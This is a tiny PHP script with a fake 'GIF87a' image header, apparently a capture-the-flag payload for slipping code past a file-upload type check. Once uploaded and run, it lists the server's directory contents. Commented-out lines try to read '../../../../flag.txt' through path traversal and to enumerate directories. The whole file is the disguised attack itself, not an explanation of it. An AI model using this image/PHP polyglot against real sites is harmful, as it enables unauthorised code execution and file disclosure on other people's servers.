GIF87a
<?php

$scan = scandir('./');
echo 'scan: ';
print_r($scan);

// print_r('is_dir: ' . is_dir($scan[5]) ? 'TRUE' : 'FALSE');
// echo file_get_contents('../../../../flag.txt');
/*
$dirs = [];
foreach ($scan as $dir) {
  if (is_dir($dir)) {
    array_push($dirs, $dir);
  }
}


echo 'dirs: ';
print_r($dirs);

*/
?>